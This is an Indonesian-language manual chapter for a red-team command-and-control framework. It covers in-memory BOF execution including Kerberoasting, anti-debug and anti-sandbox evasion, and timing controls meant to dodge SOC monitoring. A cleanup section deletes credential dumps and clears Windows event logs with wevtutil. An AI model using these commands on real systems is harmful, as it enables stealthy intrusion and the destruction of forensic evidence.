# 15 — Advanced Techniques

## BOF Execution — Beacon Object File

**BOF (Beacon Object File)** adalah format object file `.o` (COFF format) yang bisa
dieksekusi langsung di memori tanpa membuat proses baru atau menulis file ke disk.
Format ini pertama kali dipopulerkan Cobalt Strike dan kompatibel dengan banyak BOF
publik yang tersedia.

### Kenapa BOF

- Eksekusi langsung di memori agent (fileless)
- Tidak ada proses baru yang dibuat
- Akses ke Beacon API (BOFContext untuk I/O)
- Banyak BOF publik tersedia (TrustedSec, BofBeacon, dll)
- Bypass Application whitelisting dengan sempurna

### Jalankan BOF

```
taburtuai(IP:PORT) › bof 2703886d /tools/bofs/whoami.o --wait
```

```
[+] Loading BOF: whoami.o (12,288 bytes)...
[+] Executing in-memory...
[+] Output:
    CORP\john.doe
```

### BOF dengan Argumen

```
# Argumen dipack ke binary file
bof 2703886d /tools/bofs/inject.o --args-file inject_args.bin --wait
```

### BOF Publik yang Berguna

| BOF | Fungsi |
|---|---|
| `whoami.o` | Get current user context |
| `ps.o` | List processes (lebih detail dari tasklist) |
| `netstat.o` | Network connections |
| `ipconfig.o` | Network interfaces |
| `reg.o` | Registry operations |
| `adcs_enum.o` | AD Certificate Services enumeration |
| `kerberoast.o` | Kerberoasting attack |
| `portscan.o` | Internal port scanner |

---

## OPSEC Controls

### Anti-Debug Detection

Deteksi apakah agent sedang di-debug (oleh analyst atau sandbox).

```
taburtuai(IP:PORT) › opsec antidebug 2703886d --wait
```

```
[+] Anti-debug checks:
    IsDebuggerPresent         : FALSE  ✓
    CheckRemoteDebuggerPresent: FALSE  ✓
    NtQueryInformationProcess : FALSE  ✓
    Timing check              : PASSED ✓ (no timing anomaly)
    Parent process check      : PASSED ✓ (parent = explorer.exe)
    
[+] No debugger detected. Safe to proceed.
```

Jika ada debugger: `[!] DEBUGGER DETECTED — Consider aborting or pausing operations.`

---

### Anti-VM / Sandbox Detection

Deteksi apakah agent berjalan di virtual machine atau sandbox.

```
taburtuai(IP:PORT) › opsec antivm 2703886d --wait
```

```
[+] Anti-VM checks:
    CPUID hypervisor bit  : FALSE  ✓
    VMware artifacts      : FALSE  ✓
    VirtualBox artifacts  : FALSE  ✓
    Hyper-V artifacts     : FALSE  ✓
    QEMU/KVM artifacts    : FALSE  ✓
    Sandbox indicators    : FALSE  ✓
    Uptime check          : PASSED ✓ (> 10 min)
    MAC address check     : PASSED ✓
    Screen resolution     : PASSED ✓ (1920x1080)
    
[+] No VM/sandbox detected. Safe to proceed.
```

Artifact yang diperiksa:
- Registry key VMware/VirtualBox
- Device driver (vmmouse.sys, vmhgfs.sys, vboxguest.sys)
- MAC address prefix vendor (VMware: 00:0C:29, VBox: 08:00:27)
- CPU timing attack (RDTSC anomaly)
- Screen resolution kecil (sandbox biasanya 800x600 atau 1024x768)
- Jumlah proses sedikit (sandbox biasanya < 20 proses)

---

### Timegate — Working Hours Restriction

Batasi operasi agent hanya pada jam kerja tertentu. Agent tidak akan eksekusi perintah
di luar jam yang dikonfigurasi.

```
# Set agent aktif hanya jam 08:00 - 18:00
taburtuai(IP:PORT) › opsec timegate 2703886d --start 8 --end 18 --wait
```

```
[+] Timegate configured: 08:00 - 18:00 (local time on target)
[*] Agent will queue commands but not execute outside working hours.
```

**Kenapa berguna:**
- Beacon pattern lebih natural (seperti user kerja biasa)
- Hindari deteksi anomali dari SOC yang monitor jam kerja
- Sesuai dengan rules of engagement yang ditetapkan client

### Kill Date

Atur tanggal agent berhenti beroperasi secara otomatis.

```
# Set kill date (agent mati sendiri setelah tanggal ini)
opsec timegate 2703886d --kill-date 2026-12-31 --wait
```

```
[+] Kill date set: 2026-12-31
[*] Agent will stop beaconing after this date.
```

**Best practice:** Selalu set kill date sesuai scope engagement untuk memastikan
agent tidak hidup lebih lama dari yang diizinkan.

---

## Server Management

### Lihat Server Logs

```
taburtuai(IP:PORT) › logs
```

```
[+] Recent server logs (last 20):

2026-04-23 16:30:00  INFO   AGENT     Agent 2703886d checked in (DESKTOP-QLPBF95\windows)
2026-04-23 16:30:12  INFO   CMD       Queued: execute — whoami (cmd-id: a1b2c3d4)
2026-04-23 16:30:24  INFO   CMD       Completed: a1b2c3d4 (exit: 0, 1.2s)
2026-04-23 16:31:00  INFO   AGENT     Agent 2703886d checked in
2026-04-23 16:35:00  INFO   PERSIST   Setup registry_run 'WindowsDefender' on 2703886d
2026-04-23 16:35:12  WARN   AUTH      Invalid API key attempt from 10.0.0.5
```

### Filter Log

```
# Hanya error
logs --level error --limit 50

# Dari waktu tertentu
logs --since "2026-04-23 16:00:00" --limit 100

# Dari agent tertentu
logs --agent 2703886d --limit 30
```

---

## Operator Console — Tips & Shortcut

### Tab Completion

Di dalam interactive console, tekan `Tab` untuk auto-complete:
- Nama perintah
- Flag nama

### History

- Gunakan tombol panah atas/bawah untuk navigasi history perintah
- History disimpan di `/tmp/.taburtuai_history`

### Prefix ID

```
# Semua ini valid untuk ID yang sama
cmd 2703886d "whoami"
cmd 2703886d-32fb "whoami"
cmd 2703886d-32fb-4a1c "whoami"
```

### Verbose Mode

```
# Aktifkan verbose di console untuk debugging
taburtuai(IP:PORT) › cmd 2703886d "whoami" -v
[VERBOSE] POST /api/v1/agent/2703886d.../command {"operation_type":"execute","command":"whoami",...}
[VERBOSE] Response: {"success":true,"data":{"command_id":"a1b2c3d4..."}}
[+] Command queued: a1b2c3d4-...
```

### Versi

```
taburtuai(IP:PORT) › version
```

```
[+] Taburtuai C2
    Version    : 3.0.0
    Build      : 2026-04-23
    Go version : go1.21.5
```

---

## Cleanup Setelah Engagement

Penting: bersihkan semua artefak setelah engagement selesai.

```bash
# 1. Hapus persistence
persistence remove <id> --method registry_run --name "WindowsDefender" --wait
persistence remove <id> --method schtasks_onlogon --name "UpdateTask" --wait

# 2. Hapus file yang diupload
cmd <id> "del C:\Temp\*.exe && del C:\Temp\*.dmp && del C:\Temp\*.bin"

# 3. Hapus file credentials yang didownload ke server
cmd <id> "del C:\Windows\Temp\sam_* && del C:\Windows\Temp\system_* && del C:\Windows\Temp\lsass_*"

# 4. Hapus ADS yang dibuat
cmd <id> "powershell -c \"Remove-Item -Stream 'nc' C:\Windows\System32\calc.exe\""

# 5. Clear event logs (kalau scope mengizinkan)
cmd <id> "wevtutil cl System"
cmd <id> "wevtutil cl Security"
cmd <id> "wevtutil cl Application"

# 6. Matikan agent
cmd <id> "exit" # atau shutdown agent melalui command khusus

# 7. Hapus agent dari database server
agents delete <id>

# 8. Hapus stage yang masih aktif
./bin/operator stage list --server http://IP:PORT
./bin/operator stage delete TOKEN --server http://IP:PORT
```

---

**Selanjutnya:** [16 — Red Team Scenarios](16-scenarios.md)
